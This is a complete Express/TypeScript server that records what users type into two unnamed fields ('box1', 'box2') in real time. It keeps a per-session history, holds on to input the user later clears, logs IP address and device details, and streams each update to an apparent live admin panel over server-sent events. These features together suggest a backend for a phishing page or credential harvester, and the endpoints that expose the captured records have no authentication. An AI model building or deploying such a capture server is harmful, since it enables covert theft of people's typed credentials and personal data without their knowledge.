import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const isProduction = process.env.NODE_ENV === 'production';

// Ensure data directory exists
const DATA_DIR = path.resolve(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'records.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

export interface UserRecord {
  id: string;
  box1: string;
  box2: string;
  firstSeen: number;
  lastUpdated: number;
  isTyping: boolean;
  lastActiveField?: string;
  history: Array<{
    timestamp: number;
    box1: string;
    box2: string;
  }>;
  ip?: string;
  userAgent?: string;
  device?: string;
  screen?: string;
  language?: string;
}

// In-memory records store
let records: Record<string, UserRecord> = {};

// Load existing data from file
try {
  if (fs.existsSync(DATA_FILE)) {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    records = JSON.parse(raw);
  }
} catch (e) {
  console.error('Failed to load saved records:', e);
  records = {};
}

function persistRecords() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2), 'utf-8');
  } catch (e) {
    console.error('Failed to persist records to disk:', e);
  }
}

// Active SSE client connections for real-time updates
const sseClients = new Set<express.Response>();

function broadcastUpdate(type: string, data: any) {
  const payload = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(payload);
    } catch {
      sseClients.delete(client);
    }
  }
}

app.use(express.json());

// API Routes
app.get('/api/records', (req, res) => {
  const list = Object.values(records).sort((a, b) => b.lastUpdated - a.lastUpdated);
  res.json({
    success: true,
    count: list.length,
    records: list,
  });
});

app.post('/api/save-input', (req, res) => {
  const { sessionId, box1 = '', box2 = '', isTyping = false, activeField = '', deviceInfo = {} } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }

  const now = Date.now();
  const existing = records[sessionId];

  const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '127.0.0.1';

  if (!existing) {
    records[sessionId] = {
      id: sessionId,
      box1,
      box2,
      firstSeen: now,
      lastUpdated: now,
      isTyping,
      lastActiveField: activeField,
      history: [{ timestamp: now, box1, box2 }],
      ip: clientIp,
      userAgent: deviceInfo.userAgent || req.headers['user-agent'] || '',
      device: deviceInfo.platform || 'Desconocido',
      screen: deviceInfo.screen || '',
      language: deviceInfo.language || 'es',
    };
  } else {
    // Only update and append to history if there is actual input or deliberate change
    const isClearing = !box1 && !box2 && (existing.box1 || existing.box2);
    if (!isClearing) {
      const textChanged = existing.box1 !== box1 || existing.box2 !== box2;
      if (textChanged) {
        existing.history.push({ timestamp: now, box1, box2 });
        // Keep last 50 history entries per user to avoid unbounded memory growth
        if (existing.history.length > 50) {
          existing.history = existing.history.slice(-50);
        }
      }

      existing.box1 = box1;
      existing.box2 = box2;
    }

    existing.lastUpdated = now;
    existing.isTyping = isTyping;
    existing.lastActiveField = activeField;
    if (deviceInfo.userAgent) existing.userAgent = deviceInfo.userAgent;
    if (deviceInfo.platform) existing.device = deviceInfo.platform;
    if (deviceInfo.screen) existing.screen = deviceInfo.screen;
  }

  // Persist asynchronously
  persistRecords();

  // Broadcast to all SSE listeners in real time
  broadcastUpdate('record_update', records[sessionId]);

  res.json({ success: true });
});

// SSE endpoint for live updates in Admin panel
app.get('/api/live-stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  // Send initial data
  const list = Object.values(records).sort((a, b) => b.lastUpdated - a.lastUpdated);
  res.write(`event: init\ndata: ${JSON.stringify({ records: list })}\n\n`);

  sseClients.add(res);

  // Heartbeat to keep connection alive
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch {
      clearInterval(heartbeat);
      sseClients.delete(res);
    }
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    sseClients.delete(res);
  });
});

app.delete('/api/records/:id', (req, res) => {
  const { id } = req.params;
  if (records[id]) {
    delete records[id];
    persistRecords();
    broadcastUpdate('record_deleted', { id });
    return res.json({ success: true });
  }
  res.status(404).json({ error: 'Record not found' });
});

app.delete('/api/records', (req, res) => {
  records = {};
  persistRecords();
  broadcastUpdate('records_cleared', {});
  res.json({ success: true });
});

// Setup Vite or Static serving
async function startServer() {
  const distPath = path.resolve(process.cwd(), 'dist');
  const hasDist = fs.existsSync(path.join(distPath, 'index.html'));

  if (isProduction && hasDist) {
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
    app.use('*', async (req, res, next) => {
      const url = req.originalUrl;
      try {
        let template = fs.readFileSync(path.resolve(process.cwd(), 'index.html'), 'utf-8');
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
      } catch (e) {
        next(e);
      }
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
